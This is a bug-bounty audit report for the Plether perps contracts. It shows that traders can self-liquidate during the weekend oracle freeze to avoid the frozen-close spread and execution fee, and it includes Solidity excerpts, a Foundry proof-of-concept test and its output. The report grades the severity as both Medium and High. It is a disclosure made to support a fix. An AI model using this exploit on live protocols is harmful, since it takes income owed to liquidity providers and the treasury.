# \#98964 [SC-Medium] Traders can self liquidate during frozen weekend to bypass the 0.50% spread owed to LPs and the 0.04% fee owed to the treasury

**Submitted on Nov 11th 2026 at 07:47:14 UTC by @xKeywordx for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98964
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Description

On weekends, the oracle is frozen, and every exit is priced at the cached Friday price, which may already be wrong when the market reopens. To pay the LPs for that risk, a trader who closes a position while the oracle is frozen pays a 0.50% frozen-close spread to the LPs, on top of the normal 0.04% execution fee to the treasury.

A liquidation at the same cached price pays neither. It only pays a 0.025% adverse price shift and a 0.10% liquidation charge. Half of that charge goes to whoever calls the liquidation, and anyone can call it, including the owner of the position.

The owner also decides when its position becomes liquidatable. While the oracle is frozen the price cannot move, so only carry reduces the position's equity. The owner can keep its margin a few USDG above the 3% weekend requirement. Adding a little margin pushes that moment back (in the POC, 1 USDG covers about half an hour of carry). Not adding it lets carry push the position over the line within hours.

This allows any trader to do the following:

1. Before the weekend freeze, set the position's margin a few USDG above the 3% weekend requirement. Nobody can liquidate it yet.
2. While it wants to keep the position, add a little margin when needed.
3. When it wants out, stop adding margin. Carry uses up the buffer (3 hours in the below attached POC).
4. Call `OrderRouter.executeLiquidation` on its own account instead of closing the position.

In the POC below, Alice holds a 1M USDG LONG and Bob holds an equal 1M SHORT. From the same weekend state and at the same cached price, Alice exits in two ways:

|                   | Frozen close (expected) | Self-liquidation (attack) |
| ----------------- | ----------------------- | ------------------------- |
| Alice pays        | 6,403.53 USDG           | 1,753.33 USDG             |
| LPs receive       | 6,003.53 USDG           | 1,753.33 USDG             |
| Treasury receives | 400.00 USDG             | 0                         |

Alice keeps 4,650.20 USDG (0.465% of the position). The close costs her the 5,000 USDG spread plus the 400 USDG fee. The self-liquidation costs her the 250 USDG price shift plus the 1,000 USDG liquidation charge, of which 500 USDG comes back to her as the keeper. VPI and carry are the same on both paths (about 1,003 USDG), so the whole difference is the spread and the fee. The POC uses the release parameters from `packages/perps/DEPLOYMENT.md` (0.04% execution fee, 0.50% frozen-close spread, 3% weekend margin, 0.10% liquidation charge with a 50% keeper share, 0.1%/0.2% margins, vpiFactor 0.01e18, 2,500 bps adverse-confidence multiplier on a 10 bps basket confidence cap).

## Root cause

The frozen spread and the execution fee are only charged when a position is closed. A liquidation doesn't charge these fees, and the owner may liquidate their own position, and the owner controls when the position becomes liquidatable.

Looking at the `CloseAccountingLib.sol` library, `buildCloseState` adds both charges to a close:

```solidity
        state.executionFeeAssets = (notionalAssets * inputs.executionFeeBps) / 10_000;
        if (inputs.oracleFrozen) {
            state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000;
        }
```

`LiquidationAccountingLib.buildLiquidationState` only charges the 0.10% liquidation charge, and gives half of it to the keeper:

```solidity
        uint256 liquidationChargeAssets = (notionalAssets * bountyBps) / 10_000;
        ...
        state.keeperBountyAssets = Math.mulDiv(liquidationChargeAssets, keeperShareBps, 10_000);
```

`OrderLiquidationBatchLogic.executeLiquidation` uses `msg.sender` as the keeper and never compares it with `account`:

```solidity
        host.executeLiquidationBatchItem(
            account, snapshot.price, snapshot.price, snapshot.markPrice, snapshot.publishTime, msg.sender, riskOffCutoff
        );
```

`MarginClearinghouse._applyLiquidationSettlementPlan` then pays the keeper share to that address, which here is the liquidated account itself:

```solidity
            settlementBalances[execution.keeper] += execution.keeperBountyAssets;
```

The owner controls the timing. `CfdEnginePlanLib.planLiquidation` charges pending carry before the health check and uses the 3% weekend margin (`fadMarginBps`) while the oracle is frozen. `CfdEngine.addMargin` only checks that the caller owns the account, that the amount is not zero and that a position exists, so the owner can top the margin up or let it run down at any time during the weekend.

## Impact

**High: Theft of unclaimed yield.**

- Yield loss: the frozen-close spread is the LPs' income from frozen exits (`WHITEPAPER.md`: "Compensate LPs for voluntary stale-mark exit | LPs only; never treasury") and the execution fee is the treasury's income. A trader who exits through its own liquidation keeps both. Per 1M USDG exited, the trader gains 4,650.20 USDG, the LPs lose 4,250.20 USDG and the treasury loses 400 USDG. Any trader can do this every weekend and on every holiday override day, at any size the 3% weekend margin allows. LP deposits are not reduced; what is taken is the income the protocol promises the LPs and the treasury for these exits.

Additional context about why this is a new issue and not a duplicate based on previous reports and this Audit Comp rules

**Broken promises and assumptions:**

- The docs exempt liquidation from the spread only to keep liquidations working while the market is closed. `SECURITY.md`: "liquidation pricing and settlement retain adverse-confidence pricing and do not assess the spread." `SECURITY.md`: "This is a deliberate trade-off: preserve close and liquidation liveness during real closures without weakening live-market MEV protections." This treats liquidation as something that happens to an unsafe account. No doc covers a solvent trader scheduling its own liquidation, or the keeper share going back to the liquidated account.
- The spread exists for exactly this kind of exit. `DEPLOYMENT.md`: "The frozen close spread applies to voluntary reductions during `oracleFrozen`." A self-scheduled liquidation is a voluntary exit at the stale price: the trader picks the moment and stays solvent until it stops adding margin.
- The Known Limitations do not cover it. `SECURITY.md` limits the spread to "oracle-frozen voluntary closes only", but does not accept that a trader can turn its own voluntary exit into a liquidation to avoid it. `SECURITY.md` (liquidation computes no fresh VPI) is a different limit: VPI is the same on both paths in the POC.

## Recommended mitigation

While the oracle is frozen, consider charging the `frozenCloseSpreadBps` and `executionFeeBps` on the liquidated notional as part of the liquidation charges, with the same full-close waiver rules as a frozen close. Then a liquidation is never a cheaper exit than a frozen close.

## Proof of Concept

## Proof of Concept

Add these two imports at the top of the existing `packages/perps/test/perps/accounting/liquidation/Liquidation.t.sol` test file, then paste the code below at the end of its `LiquidationTest` contract (before the closing brace). The code defines four small helpers for this POC (`_setUpReleaseWeekendPosition`, `_installFrozenExitMark`, `_frozenLiquidationPriceLong`, `_aliceAssets`); everything else comes from the file (`alice`, `keeper`, `FRIDAY_EVENING`) or from `BasePerpTest`. The setup uses the suite's usual shortcuts: the test contract sets the release parameters as owner, and `_open` and `_installFrozenExitMark` call the engine as the Router to open the two positions and post the Friday price. Every step of the attack (`addMargin`, `commitOrder`/`executeOrder`, `executeLiquidation`) is a normal call by Alice or by a keeper. `engineLens.previewLiquidation` is only used to find the minute the position crosses the line.

```solidity
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";
```

```solidity
    // ------------------------------------------------------------------------------------------------------------
    // POC: while the oracle is frozen, Alice exits by liquidating her own account instead of closing it. Same
    // position, same state, same cached price. The close pays the LPs' 0.50% frozen spread and the treasury's 0.04%
    // fee. The self-liquidation pays neither, and the keeper half of the liquidation charge goes back to Alice.
    // ------------------------------------------------------------------------------------------------------------

    function test_FrozenSelfLiquidation_SkipsFrozenCloseSpread() public {
        uint256 size = 1_000_000e18; // 1M USDG LONG at the $1.00 Friday price; Bob holds the opposite 1M SHORT
        _setUpReleaseWeekendPosition(size, 5e6); // Alice's margin sits 5 USDG above the 3% frozen-market line

        // Weekend: the oracle is frozen and every exit uses the cached Friday price.
        vm.warp(FRIDAY_EVENING + 30 minutes + 1);
        assertTrue(engine.isOracleFrozen(), "oracle frozen");
        uint256 liquidationPrice = _frozenLiquidationPriceLong();

        // Alice is solvent, so nobody can liquidate her yet.
        vm.prank(keeper);
        vm.expectRevert(ICfdEngineTypes.CfdEngine__PositionIsSolvent.selector);
        router.executeLiquidation(alice, new bytes[](0));

        // Alice stops topping up her margin. Weekend carry uses up her 5 USDG buffer.
        uint256 frozenAt = vm.getBlockTimestamp();
        while (!engineLens.previewLiquidation(alice, liquidationPrice).liquidatable) {
            vm.warp(vm.getBlockTimestamp() + 10 minutes);
        }
        assertTrue(engine.isOracleFrozen(), "still frozen");
        console2.log("Minutes until Alice can liquidate herself", (vm.getBlockTimestamp() - frozenAt) / 60);

        // Had she wanted to keep the position, 1 USDG of extra margin would have pushed that moment back.
        uint256 snap = vm.snapshotState();
        vm.prank(alice);
        engine.addMargin(alice, 1e6);
        assertFalse(engineLens.previewLiquidation(alice, liquidationPrice).liquidatable, "1 USDG keeps the position");
        vm.revertToState(snap);

        uint256 aliceBefore = _aliceAssets();
        uint256 lpBefore = pool.totalAssets();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        // Expected: Alice closes her position (frozen voluntary close).
        snap = vm.snapshotState();
        vm.prank(alice);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
        vm.prank(alice);
        router.executeOrder(orderId, new bytes[](0));
        (uint256 sizeAfterClose,,,,,,) = engine.positions(alice);
        uint256 aliceCostClose = aliceBefore - _aliceAssets();
        uint256 lpGainClose = pool.totalAssets() - lpBefore;
        uint256 treasuryGainClose = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
        vm.revertToState(snap);

        // Attack: from the same state, Alice liquidates her own account instead.
        vm.prank(alice);
        router.executeLiquidation(alice, new bytes[](0));
        (uint256 sizeAfterLiquidation,,,,,,) = engine.positions(alice);
        uint256 aliceCostLiquidation = aliceBefore - _aliceAssets();
        uint256 lpGainLiquidation = pool.totalAssets() - lpBefore;
        uint256 treasuryGainLiquidation = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;

        console2.log("Alice's exit cost, frozen close      (USDG, 6 dec)", aliceCostClose);
        console2.log("Alice's exit cost, self-liquidation  (USDG, 6 dec)", aliceCostLiquidation);
        console2.log("LPs receive, frozen close            (USDG, 6 dec)", lpGainClose);
        console2.log("LPs receive, self-liquidation        (USDG, 6 dec)", lpGainLiquidation);
        console2.log("Treasury receives, frozen close      (USDG, 6 dec)", treasuryGainClose);
        console2.log("Treasury receives, self-liquidation  (USDG, 6 dec)", treasuryGainLiquidation);
        console2.log("Alice keeps by self-liquidating      (USDG, 6 dec)", aliceCostClose - aliceCostLiquidation);

        assertEq(sizeAfterClose, 0, "close exits the whole position");
        assertEq(sizeAfterLiquidation, 0, "self-liquidation exits the whole position");
        assertEq(treasuryGainClose, 400e6, "close pays the 0.04% fee to the treasury");
        assertEq(treasuryGainLiquidation, 0, "self-liquidation pays the treasury nothing");
        assertGt(aliceCostClose - aliceCostLiquidation, 4500e6, "self-liquidation is over 45 bps cheaper for Alice");
        assertGt(lpGainClose - lpGainLiquidation, 4000e6, "LPs lose the frozen spread");
    }

    /// @dev This file's setUp keeps the BasePerpTest defaults, so the release values are set here: maintenance 0.1%,
    ///      initial 0.2%, vpiFactor 0.01e18, adverse-confidence multiplier 2,500. Fee 4 bps, spread 50 bps, frozen
    ///      margin 3% and the 10 bps liquidation charge with a 50% keeper share already match.
    function _setUpReleaseWeekendPosition(
        uint256 size,
        uint256 bufferAssets
    ) private {
        address bob = address(0xB0B);
        _fundJunior(address(this), 4_000_000e6); // 5M Junior in total, so the 1M position fits the skew cap
        CfdTypes.RiskParams memory params = _riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
        _setRiskParams(params);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(config);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen close spread");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release basket confidence cap");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
        _fundTrader(alice, 190_000e6); // 200k in total with the setUp deposit
        _fundTrader(bob, 200_000e6);

        // Friday, market open: Bob opens 1M SHORT and Alice opens 1M LONG. The book is balanced, so both of
        // Alice's exits pay the same VPI.
        _installFrozenExitMark(FRIDAY_EVENING - 70 minutes);
        _open(bob, CfdTypes.Side.SHORT, size, 60_000e6, 1e8, pool.totalAssets());
        _open(alice, CfdTypes.Side.LONG, size, 10_000e6, 1e8, pool.totalAssets());

        // Alice sets her margin to the 3% frozen-market requirement plus a small buffer.
        _installFrozenExitMark(FRIDAY_EVENING - 10 minutes);
        uint256 notionalAtLiquidation = (size * _frozenLiquidationPriceLong()) / 1e20;
        uint256 targetMargin = (notionalAtLiquidation * 300) / 10_000 + (notionalAtLiquidation - (size * 1e8) / 1e20)
            + bufferAssets;
        uint256 topUp = targetMargin - clearinghouse.pnlPledgeAssets(alice);
        vm.prank(alice);
        engine.addMargin(alice, topUp);
        _installFrozenExitMark(FRIDAY_EVENING - 1); // last live Friday price, cached for the weekend
    }

    /// @dev Installs the $1.00 price through the Router address, as the other tests in this file do.
    function _installFrozenExitMark(
        uint256 timestamp
    ) private {
        vm.warp(timestamp);
        vm.prank(address(router));
        engine.updateMarkPrice(1e8, uint64(timestamp));
    }

    /// @dev Frozen liquidation price for a LONG: the cached price plus the adverse shift
    ///      (multiplier x basket confidence cap), as in PletherOracle's frozen basket.
    function _frozenLiquidationPriceLong() private view returns (uint256) {
        uint256 mark = engine.lastMarkPrice();
        uint256 confidence = (mark * pletherOracle.basketMaxConfidenceRatioBps()) / 10_000;
        return mark + (confidence * pletherOracle.adverseConfidenceMultiplierBps()) / 10_000;
    }

    function _aliceAssets() private view returns (uint256) {
        return clearinghouse.balanceAssets(alice) + engine.traderClaimBalanceAssets(alice);
    }
```

Test output

```solidity
forge test --mt test_FrozenSelfLiquidation_SkipsFrozenCloseSpread -vv

Ran 1 test for test/perps/accounting/liquidation/Liquidation.t.sol:LiquidationTest
[PASS] test_FrozenSelfLiquidation_SkipsFrozenCloseSpread() (gas: 7608795)
Logs:
  Minutes until Alice can liquidate herself 180
  Alice's exit cost, frozen close      (USDG, 6 dec) 6403532605
  Alice's exit cost, self-liquidation  (USDG, 6 dec) 1753333934
  LPs receive, frozen close            (USDG, 6 dec) 6003532605
  LPs receive, self-liquidation        (USDG, 6 dec) 1753333934
  Treasury receives, frozen close      (USDG, 6 dec) 400000000
  Treasury receives, self-liquidation  (USDG, 6 dec) 0
  Alice keeps by self-liquidating      (USDG, 6 dec) 4650198671

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 22.10ms (14.51ms CPU time)
Ran 1 test suite in 56.53ms (22.10ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
